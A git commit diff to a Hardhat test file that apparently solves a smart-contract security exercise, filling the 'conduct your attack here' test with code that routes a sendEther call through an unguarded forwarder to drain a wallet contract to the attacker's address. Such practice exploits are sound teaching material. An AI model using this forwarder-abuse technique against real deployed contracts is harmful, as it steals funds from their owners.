4b63f80b3516acbacbe78d30e4ddc9800b60b71e
Zainab Oufqir <zayna.oufkir@gmail.com>
2024-12-26 22:06:58 +0100

    Forwarder done

--- test/Forwarder.js
+++ test/Forwarder.js
@@ -7,49 +7,44 @@ const FORWARDER_NAME = "Forwarder";
 const NAME = "Forwarder tests";
 
 describe(NAME, function () {
-  async function setup() {
-    const [, attackerWallet] = await ethers.getSigners();
-    const value = ethers.utils.parseEther("1");
+    async function setup() {
+        const [, attackerWallet] = await ethers.getSigners();
+        const value = ethers.utils.parseEther("1");
 
-    const forwarderFactory = await ethers.getContractFactory(FORWARDER_NAME);
-    const forwarderContract = await forwarderFactory.deploy();
+        const forwarderFactory = await ethers.getContractFactory(FORWARDER_NAME);
+        const forwarderContract = await forwarderFactory.deploy();
 
-    const walletFactory = await ethers.getContractFactory(WALLET_NAME);
-    const walletContract = await walletFactory.deploy(
-      forwarderContract.address,
-      { value: value }
-    );
+        const walletFactory = await ethers.getContractFactory(WALLET_NAME);
+        const walletContract = await walletFactory.deploy(forwarderContract.address, { value: value });
 
-    return { walletContract, forwarderContract, attackerWallet };
-  }
+        return { walletContract, forwarderContract, attackerWallet };
+    }
 
-  describe("exploit", async function () {
-    let walletContract,
-      forwarderContract,
-      attackerWallet,
-      attackerWalletBalanceBefore;
-    before(async function () {
-      ({ walletContract, forwarderContract, attackerWallet } =
-        await loadFixture(setup));
-      attackerWalletBalanceBefore = await ethers.provider.getBalance(
-        attackerWallet.address
-      );
+    describe("exploit", async function () {
+        let walletContract, forwarderContract, attackerWallet, attackerWalletBalanceBefore;
+        before(async function () {
+            ({ walletContract, forwarderContract, attackerWallet } = await loadFixture(setup));
+            attackerWalletBalanceBefore = await ethers.provider.getBalance(attackerWallet.address);
+        });
+
+        it("conduct your attack here", async function () {
+            const iface = new ethers.utils.Interface(["function sendEther(address destination, uint256 amount)"]);
+            const encoded = iface.encodeFunctionData("sendEther", [
+                attackerWallet.address,
+                ethers.utils.parseEther("1"),
+            ]);
+            await forwarderContract.functionCall(walletContract.address, encoded);
+        });
+
+        after(async function () {
+            const attackerWalletBalanceAfter = await ethers.provider.getBalance(attackerWallet.address);
+            expect(attackerWalletBalanceAfter.sub(attackerWalletBalanceBefore)).to.be.closeTo(
+                ethers.utils.parseEther("1"),
+                1000000000000000
+            );
+
+            const walletContractBalance = await ethers.provider.getBalance(walletContract.address);
+            expect(walletContractBalance).to.be.equal("0");
+        });
     });
-
-    it("conduct your attack here", async function () {});
-
-    after(async function () {
-      const attackerWalletBalanceAfter = await ethers.provider.getBalance(
-        attackerWallet.address
-      );
-      expect(
-        attackerWalletBalanceAfter.sub(attackerWalletBalanceBefore)
-      ).to.be.closeTo(ethers.utils.parseEther("1"), 1000000000000000);
-
-      const walletContractBalance = await ethers.provider.getBalance(
-        walletContract.address
-      );
-      expect(walletContractBalance).to.be.equal("0");
-    });
-  });
 });
